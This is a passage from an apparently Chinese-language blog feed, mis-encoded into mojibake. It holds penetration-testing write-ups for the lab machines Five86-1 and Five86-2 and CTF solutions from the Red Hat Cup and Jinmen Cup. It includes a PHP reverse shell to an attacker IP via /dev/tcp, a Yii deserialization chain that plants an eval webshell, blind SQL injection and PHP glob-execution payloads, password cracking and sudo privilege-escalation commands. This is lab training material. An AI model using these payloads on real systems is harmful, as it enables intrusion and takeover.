href="http://192.168.110.140/images/bill.png">http://192.168.110.140/images/bill.png</a> çš„ exif ä¸­å­˜åœ¨æŸç¥ç§˜å­—ç¬¦ä¸² <code>coffeestains</code>ï¼Œå°è¯•ä½œä¸º blumbergh ç”¨æˆ·å¯†ç ç™»å½•ã€‚æˆåŠŸç™»å½•ï¼ŒæŸ¥çœ‹ä¸€ä¸‹æƒé™ï¼š</p><p><img src="https://i.loli.net/2021/05/13/iEvmcHzBZ6uaL1I.png"></p><p><img src="https://i.loli.net/2021/05/13/4Bw1tUfXdkmvNQ6.png"></p><p>å¯ä»¥å‘ç° <code>/usr/share/cleanup/tidyup.sh</code> æ²¡æœ‰å†™å…¥æƒé™ï¼Œä½†æ˜¯å¯ä»¥ç”¨ root æƒé™æ‰§è¡Œ tee å‘½ä»¤æŠŠåå¼¹ shell å‘½ä»¤å†™å…¥ç„¶åæ‰§è¡Œã€‚ï¼ˆteeå‘½ä»¤ç”¨äºè¯»å–æ ‡å‡†è¾“å…¥çš„æ•°æ®ï¼Œå¹¶å°†å…¶å†…å®¹è¾“å‡ºæˆæ–‡ä»¶ï¼‰</p><p>çœ‹ä¸€ä¸‹ tidyup.sh é‡Œé¢æ˜¯å•¥å§ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/lib/tomcat6/webapps &amp;&amp; find swingline -mindepth 1 -maxdepth 10 | xargs rm -rf</span><br></pre></td></tr></table></figure><p>æ¯éš”ä¸‰åˆ†é’Ÿå°±ä¼šæ¸…ç† webapps ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼Œæ‰€ä»¥ä¹‹å‰ä¼ çš„ğŸå¦‚æœä¸åå¼¹ shell çš„è¯å¾ˆå¿«å°±ä¼šè¢«åˆ æ‰ã€‚</p><p>æ¥ä¸‹æ¥å°±æ˜¯å†™å…¥å‘½ä»¤å¼¹ shell äº†ï¼šï¼ˆåŒæ—¶å¦å¤–å¼€ä¸€ä¸ª terminal æ¥æ¥å— shellï¼‰</p><p><img src="https://i.loli.net/2021/05/13/7PcaTGvr3MXZBwm.png"></p><p><img src="https://i.loli.net/2021/05/13/FvfjmRVUbPzk5WX.png"></p><p>å¯ä»¥å‘ç°æˆ‘ä»¬å·²ç»ææƒè‡³äº† rootï¼Œåé¢ flag ä»€ä¹ˆçš„ä¾¿ä¸é‡è¦äº†ã€‚</p><h2 id="Five86-1"><a href="#Five86-1" class="headerlink" title="Five86-1"></a>Five86-1</h2><p>Nmap æ‰«ä¸€ä¸‹ã€‚</p><p><img src="https://i.loli.net/2021/05/13/WTVzvbgFcrksuU2.png" alt="U_MH_Q9JAM05PC__GW77DJ5.png"></p><p>10000 ç«¯å£å¼€äº†ä¸ª <code>Webmin httpd 1.920</code>ï¼Œå¯ä»¥æœä¸€ä¸‹æœ‰æ—  expã€‚ï¼ˆWebmin æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„ UNIX web ç®¡ç†ï¼‰</p><p><img src="https://i.loli.net/2021/05/14/x4BjoNLF6eKCp1v.png"></p><p>robots.txt é‡Œå‘ç° /ona è·¯ç”±ï¼Œè®¿é—®ä¸€ä¸‹ï¼Œå‘ç°æ˜¯ OpenNetAdminï¼Œæœä¸€ä¸‹æœ‰æ—  expï¼š</p><p><img src="https://i.loli.net/2021/05/14/XfprCJUjvYn7TIK.png"></p><p><img src="https://i.loli.net/2021/05/14/HuPBYdxZX9LylKs.png"></p><p>æŠŠ exp å¤åˆ¶å‡ºæ¥ä¸¢åˆ° msf é‡Œé¢ï¼Œç›´æ¥æ‰“ä¸€å‘ï¼š</p><p><code>cp /usr/share/exploitdb/exploits/php/webapps/47772.rb /usr/share/metasploit-framework/modules/exploits</code></p><p><img src="https://i.loli.net/2021/05/14/IFRLAYWqaoGtS8v.png" alt="2VVE3EMW08WLWS__PGPW_Z9.png"></p><p><img src="https://i.loli.net/2021/05/14/vHzlJdCqMFou97O.jpg"></p><p>åœ¨å®¶ç›®å½•é‡Œé¢å‘ç°æç¤ºï¼š</p><p><img src="https://i.loli.net/2021/05/14/Qy6oFRhgStKIm3x.png"></p><p>douglas ç”¨æˆ·çš„å¯†ç ç”± aefhrt æ„æˆåä½ï¼Œå¯ä»¥çˆ†ç ´ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">crunch 10 10 aefhrt &gt; passwd</span><br><span class="line">echo &#39;douglas:$apr1$9fgG&#x2F;hiM$BtsL9qpNHUlylaLxk81qY1&#39; &gt; 1.txt</span><br><span class="line">john --wordlist&#x3D;passwd 1.txt</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/05/14/UxMPp2Eg9VF6rBL.jpg"></p><p>è¦çˆ†å¾ˆä¹…ï¼Œçˆ†å‡ºæ¥å¯†ç ä¸ºï¼šfatherrrrrï¼Œç™»å½•ä¸€æ³¢ï¼š</p><p><img src="https://i.loli.net/2021/05/14/drFCt83HUP5DegE.jpg"></p><p>sudo -l å‘ç°å¯ä»¥ä»¥ jen çš„èº«ä»½æ‰§è¡Œ cp å‘½ä»¤ï¼š</p><p><img src="https://i.loli.net/2021/05/14/6FVjiADQZuWY8Id.jpg"></p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å†™å…¥ jen çš„ authorized_keys æ¥åŒ…å« douglas çš„å…¬é’¥ï¼Œä»è€Œç›´æ¥ç”¨ douglas çš„ id_rsa å…å¯† ssh ç™»å½• jenï¼Œå› ä¸º jen æ²¡æœ‰æƒé™è®¿é—® douglasï¼Œè€Œ douglas ä¹Ÿäº¦ç„¶ï¼Œæ‰€ä»¥å…ˆä¸¢åˆ° /tmpï¼Œå†è½¬ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cp ~/.ssh/id_rsa.pub /tmp/authorized_keys</span><br><span class="line">chmod 777 /tmp/authorized_keys</span><br><span class="line">sudo -u jen /bin/cp /tmp/authorized_keys /home/jen/.ssh/</span><br><span class="line">ssh -i id_rsa jen@127.0.0.1</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/05/14/dbGzqjw1trkXy3s.jpg"></p><p>è¿˜å¯ä»¥å‘ç°ä¸€ä¸ª mailï¼Œçœ‹ä¸€ä¸‹ï¼š</p><p><img src="https://i.loli.net/2021/05/14/9wqnAT3EsrU5e4t.jpg"></p><p>è·å–åˆ°äº† moss ç”¨æˆ·çš„å¯†ç ï¼Œç™»ä¸Šï¼š</p><p><img src="https://i.loli.net/2021/05/14/rda38HnP6S5pfij.jpg"></p><p>å®¶ç›®å½•é‡Œé¢å‘ç° .games/ é‡Œé¢æœ‰æå‡æƒé™çš„æ–‡ä»¶ï¼Œç›´æ¥æ‰§è¡Œï¼š</p><p><img src="https://i.loli.net/2021/05/14/LwxjPEQHvTBUK68.png"></p><p>è·å¾— root æƒé™ï¼š</p><p><img src="https://i.loli.net/2021/05/14/e4d3WR8wcLba9XV.jpg"></p><p>root é‡Œé¢è½»å– flagï¼š</p><p><img src="https://i.loli.net/2021/05/14/2xlvmORPjBCTIt8.jpg"></p><h2 id="Five86-2"><a href="#Five86-2" class="headerlink" title="Five86-2"></a>Five86-2</h2><p>Nmap æ‰«ï¼š</p><p><img src="https://i.loli.net/2021/05/14/nrgfwdBFH7Wqkx5.png"></p><p>æ— æ³•åŠ è½½çš„è¯å¯ä»¥å°è¯•åœ¨ C:\Windows\System32\drivers\etc\hosts æ·»åŠ ä¸€æ¡ <code>192.168.237.138 five86-2</code>ï¼ˆé¶æœº IP è‡ªæ”¹ï¼‰ã€‚</p><p>æ˜¯ WordPress æ¡†æ¶ï¼Œç”¨ wpscan çˆ†ç ´ç”¨æˆ·åï¼š<code>wpscan --url &quot;http://192.168.237.138&quot; -e u</code></p><p><img src="https://i.loli.net/2021/05/14/tywcNYSPUJsLlnV.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">peter</span><br><span class="line">admin</span><br><span class="line">barney</span><br><span class="line">stephen</span><br><span class="line">gillian</span><br></pre></td></tr></table></figure><p>ç„¶åä½¿ç”¨ kali è‡ªå¸¦çš„ rockyou.txt çˆ†ä¸€ä¸‹å¯†ç ï¼šï¼ˆrockyou.txt æ˜¯ç”± rockyou.txt.gz è§£å‹è€Œæ¥ï¼‰ï¼ˆçˆ†ä½ ğŸä¸€å¹´ï¼‰</p><p><code>wpscan --url &quot;http://192.168.237.138&quot; -U user.txt -P /usr/share/wordlists/rockyou.txt</code></p><p><img src="https://i.loli.net/2021/05/14/vViWaf52dl8Jgns.png"></p><p>çˆ†å‡ºæ¥ä¸¤å¯¹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username: barney, Password: spooky1</span><br><span class="line">Username: stephen, Password: apollo1</span><br></pre></td></tr></table></figure><p>å¯ä»¥åˆ©ç”¨ <a href="https://www.freebuf.com/vuls/205735.html%EF%BC%8C%E6%8F%92%E4%BB%B6%E4%BC%A0%E9%A9%AC%E3%80%82">https://www.freebuf.com/vuls/205735.htmlï¼Œæ’ä»¶ä¼ é©¬ã€‚</a></p><p><img src="https://i.loli.net/2021/05/19/dqM8aRlOjfxvWVI.png"></p><p><img src="https://i.loli.net/2021/05/19/Xorw1b42TLCGy87.png"></p><p><img src="https://i.loli.net/2021/05/19/HE7dR5Nf4iKTSIl.png"></p><p>åŒ…å« 111.php ä¸ index.htmlï¼Œ111.phpåå¼¹ä¸€ä¸ª shellï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> exec(<span class="string">&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.237.253/2333 0&gt;&amp;1&#x27;&quot;</span>);phpinfo(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/05/19/PpTcRSDNJ6mUbzG.png"></p><p>åˆ©ç”¨ä¹‹å‰çˆ†å‡ºæ¥çš„è´¦æˆ·å¯†ç ï¼ˆstephen:apollo1ï¼‰ææƒã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su stephen</span><br><span class="line">python3 -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/05/19/JnWDdif5eupOMAV.png"></p><p><code>ps -auxwww</code> çœ‹ä¸€ä¸‹è·‘çš„è¿›ç¨‹ã€‚</p><p><img src="https://i.loli.net/2021/05/19/PZdhlvFrRwMOfEa.png"></p><p>å‘ç° paul ç”¨æˆ·è·‘äº†ä¸ª ftp ä¸Šä¼ çš„è„šæœ¬ã€‚tcpdump å‘ç°æœ‰å¤šå¼ ç½‘å¡ï¼Œå°è¯•ç›‘å¬æ¥è·å–ç”¨æˆ·åå¯†ç ã€‚    </p><p><img src="https://i.loli.net/2021/05/19/V8an2dloi7FyEAG.png"></p><hr><h3 id="tcpdump-å¸¸ç”¨å‚æ•°åŠä½¿ç”¨æ–¹æ³•"><a href="#tcpdump-å¸¸ç”¨å‚æ•°åŠä½¿ç”¨æ–¹æ³•" class="headerlink" title="tcpdump å¸¸ç”¨å‚æ•°åŠä½¿ç”¨æ–¹æ³•"></a>tcpdump å¸¸ç”¨å‚æ•°åŠä½¿ç”¨æ–¹æ³•</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">-cï¼šæŒ‡å®šè¦æŠ“å–çš„åŒ…æ•°é‡ã€‚</span><br><span class="line"></span><br><span class="line">-i interfaceï¼šæŒ‡å®štcpdumpéœ€è¦ç›‘å¬çš„æ¥å£ã€‚é»˜è®¤ä¼šæŠ“å–ç¬¬ä¸€ä¸ªç½‘ç»œæ¥å£</span><br><span class="line"></span><br><span class="line">-nï¼šå¯¹åœ°å€ä»¥æ•°å­—æ–¹å¼æ˜¾å¼ï¼Œå¦åˆ™æ˜¾å¼ä¸ºä¸»æœºåï¼Œä¹Ÿå°±æ˜¯è¯´-né€‰é¡¹ä¸åšä¸»æœºåè§£æã€‚</span><br><span class="line"></span><br><span class="line">-nnï¼šé™¤äº†-nçš„ä½œç”¨å¤–ï¼Œè¿˜æŠŠç«¯å£æ˜¾ç¤ºä¸ºæ•°å€¼ï¼Œå¦åˆ™æ˜¾ç¤ºç«¯å£æœåŠ¡åã€‚</span><br><span class="line"></span><br><span class="line">-Pï¼šæŒ‡å®šè¦æŠ“å–çš„åŒ…æ˜¯æµå…¥è¿˜æ˜¯æµå‡ºçš„åŒ…ã€‚å¯ä»¥ç»™å®šçš„å€¼ä¸º&quot;in&quot;ã€&quot;out&quot;å’Œ&quot;inout&quot;ï¼Œé»˜è®¤ä¸º&quot;inout&quot;ã€‚</span><br><span class="line"></span><br><span class="line">-Dï¼šåˆ—å‡ºå¯ç”¨äºæŠ“åŒ…çš„æ¥å£ã€‚å°†ä¼šåˆ—å‡ºæ¥å£çš„æ•°å€¼ç¼–å·å’Œæ¥å£åï¼Œå®ƒä»¬éƒ½å¯ä»¥ç”¨äº&quot;-i&quot;åã€‚</span><br><span class="line"></span><br><span class="line">-Fï¼šä»æ–‡ä»¶ä¸­è¯»å–æŠ“åŒ…çš„è¡¨è¾¾å¼ã€‚è‹¥ä½¿ç”¨è¯¥é€‰é¡¹ï¼Œåˆ™å‘½ä»¤è¡Œä¸­ç»™å®šçš„å…¶ä»–è¡¨è¾¾å¼éƒ½å°†å¤±æ•ˆã€‚</span><br><span class="line"></span><br><span class="line">-wï¼šå°†æŠ“åŒ…æ•°æ®è¾“å‡ºåˆ°æ–‡ä»¶ä¸­è€Œä¸æ˜¯æ ‡å‡†è¾“å‡ºã€‚å¯ä»¥åŒæ—¶é…åˆ&quot;-G&quot; &quot;time&quot; é€‰é¡¹ä½¿å¾—è¾“å‡ºæ–‡ä»¶æ¯timeç§’å°±è‡ªåŠ¨åˆ‡æ¢åˆ°å¦ä¸€ä¸ªæ–‡ä»¶ã€‚å¯é€šè¿‡&quot;-r&quot;é€‰é¡¹è½½å…¥è¿™äº›æ–‡ä»¶ä»¥è¿›è¡Œåˆ†æå’Œæ‰“å°ã€‚</span><br><span class="line"></span><br><span class="line">-rï¼šä»ç»™å®šçš„æ•°æ®åŒ…æ–‡ä»¶ä¸­è¯»å–æ•°æ®ã€‚ä½¿ç”¨&quot;-&quot;è¡¨ç¤ºä»æ ‡å‡†è¾“å…¥ä¸­è¯»å–ã€‚</span><br></pre></td></tr></table></figure><hr><p><img src="https://i.loli.net/2021/05/19/2mNkJy1uCKMbYgH.png"></p><p>æˆ‘ä»–é©¬ï¼ŒçœŸçš„çƒ¦siã€‚æŠ„ä¸€æ³¢å¸ˆå‚…ä»¬çš„ç­”æ¡ˆç®—äº†ï¼š<code>paul:esomepasswford</code>ï¼š</p><p><img src="https://i.loli.net/2021/05/19/2pURNmyEvLFZMwg.png"></p><p><code>sudo -l</code> å‘ç°å¯ä»¥ä»¥ peter èº«ä»½æ‰§è¡Œ serviceï¼Œæˆ‘ä»¬ç›´æ¥ <code>sudo -u peter service ../../bin/bash</code> ææƒï¼š</p><p><img src="https://i.loli.net/2021/05/19/UOBlHNtoF8kKfhC.png"></p><p><code>sudo -l</code> ï¼Œç›´æ¥ passwd æ”¹ root å¯†ç ï¼š</p><p><img src="https://i.loli.net/2021/05/19/Rxh48O3PadGkH6g.png"></p><p><img src="https://i.loli.net/2021/05/19/WvAkua5Oldw2RIq.png"></p><p>å®Œäº‹ã€‚</p><p><img src="https://i.loli.net/2021/05/19/kQKUtMLF6RisHmV.png"></p><h2 id="å…¶å®ƒ"><a href="#å…¶å®ƒ" class="headerlink" title="å…¶å®ƒ"></a>å…¶å®ƒ</h2><h3 id="Nmap-ç›¸å…³"><a href="#Nmap-ç›¸å…³" class="headerlink" title="Nmap ç›¸å…³"></a>Nmap ç›¸å…³</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-sT -sS: éšç§˜çš„TCPè¿æ¥æ‰«é¢ï¼Œå¾ˆå¯é </span><br><span class="line">-A: è¯¦ç»†æ‰«æ</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021_Red_Hat and WICCTF_WP</title>
      <link href="2021/05/09/2021-Red-Hat-and-WICCTF-WP/"/>
      <url>2021/05/09/2021-Red-Hat-and-WICCTF-WP/</url>
      
        <content type="html"><![CDATA[<p>è¿˜åœ¨å®‰å¾½ï¼Œç›´æ¥åœ¨é…’åº—é‡Œçœ‹äº†çœ‹é¢˜ã€‚</p><h2 id="çº¢å¸½æ¯"><a href="#çº¢å¸½æ¯" class="headerlink" title="çº¢å¸½æ¯"></a>çº¢å¸½æ¯</h2><h3 id="find-it"><a href="#find-it" class="headerlink" title="find_it"></a>find_it</h3><p>robots.txtï¼Œswp æºç æ³„éœ²</p><p>flag åœ¨ phpinfo</p><h3 id="framework"><a href="#framework" class="headerlink" title="framework"></a>framework</h3><p>Yii çš„ååºåˆ—åŒ–é“¾</p><p>POCï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$modelClass</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&quot;file_put_contents(&#x27;1.php&#x27;, &#x27;&lt;?php eval(\$_POST[Du1]);&#x27;);&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mzp7czoxMToiY2hlY2tBY2Nlc3MiO3M6NjoiYXNzZXJ0IjtzOjI6ImlkIjtzOjU1OiJmaWxlX3B1dF9jb250ZW50cygnMS5waHAnLCAnPD9waHAgZXZhbCgkX1BPU1RbRHUxXSk7Jyk7IjtzOjEwOiJtb2RlbENsYXNzIjtOO31pOjE7czozOiJydW4iO319fX0=</span></span><br></pre></td></tr></table></figure><p>about é‡Œä¼ å…¥ï¼Œå†™ä¸ªğŸï¼ŒApache_mod_cgi ç»• disable_funcï¼Œreadflag è¯»å– flagã€‚</p><h3 id="WebsiteManger"><a href="#WebsiteManger" class="headerlink" title="WebsiteManger"></a>WebsiteManger</h3><p>ç›²æ³¨å¾—åˆ°ç®¡ç†å‘˜å¯†ç ï¼Œpayloadï¼š<code>^((ascii(substr((select(group_concat(password))from(users)),&#123;&#125;,1)))=&#123;&#125;)</code></p><p>SSRF ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F;&#x2F;flag</span><br><span class="line">127.0.0.1</span><br></pre></td></tr></table></figure><h3 id="ezlight"><a href="#ezlight" class="headerlink" title="ezlight"></a>ezlight</h3><p>å å‘ï¼Œåƒåœ¾æŸæ˜¥ç§‹åäºŒç‚¹å°±æ€¥ç€å…³é¶æœºï¼Œæ²¡æ¥å¾—åŠå¤ç°ï¼Œå…ˆå ä¸ªå‘ï¼ŒY1ng å¸ˆå‚…å¤ªQQQQQäº†</p><p><a href="https://www.gem-love.com/websecurity/2763.html#0x01_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">https://www.gem-love.com/websecurity/2763.html#0x01_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0</a></p><h2 id="æ´¥é—¨æ¯"><a href="#æ´¥é—¨æ¯" class="headerlink" title="æ´¥é—¨æ¯"></a>æ´¥é—¨æ¯</h2><h3 id="power-cut"><a href="#power-cut" class="headerlink" title="power_cut"></a>power_cut</h3><p>swp æºç æ³„éœ²ã€‚</p><p>ååºåˆ—åŒ–ï¼Œç›´æ¥åˆ©ç”¨ logger çš„ readfile è¯»å– flagï¼Œflag è¢«è¿‡æ»¤ï¼Œå¯ä»¥ç”¨åŒå†™ç»•è¿‡ã€‚</p><p><code>poc</code>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">logger</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$logFile</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$initMsg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$exitMsg</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">weblog</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$weblogfile</span>=<span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> weblog()));</span><br></pre></td></tr></table></figure><p><code>payload</code>ï¼š</p><p><code>O%3A6%3A%22weblog%22%3A1%3A%7Bs%3A10%3A%22weblogfile%22%3Bs%3A5%3A%22%2Fflflagag%22%3B%7D</code></p><h3 id="hatephp"><a href="#hatephp" class="headerlink" title="hatephp"></a>hatephp</h3><p>php5ï¼Œpå¸ˆå‚…æ–‡ç« é‡Œæåˆ°è¿‡è¿™ä¸ªæ–¹æ³•ï¼Œ@ è¢«è¿‡æ»¤ï¼Œç”¨ ? å³å¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;?code&#x3D;?&gt;&lt;?&#x3D;&#96;.%20&#x2F;???&#x2F;????????[?-[]&#96;;?&gt; HTTP&#x2F;1.1</span><br><span class="line">Host: 122.112.214.101:20004</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;90.0.4430.93 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type:multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line">Content-Length: 170</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;3.sh&quot;</span><br><span class="line"></span><br><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line"></span><br><span class="line">cat &#x2F;flag</span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA--</span><br></pre></td></tr></table></figure><h3 id="ezsql"><a href="#ezsql" class="headerlink" title="ezsql"></a>ezsql</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    session_start();</span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>] ?? <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$url</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="variable">$a</span> = 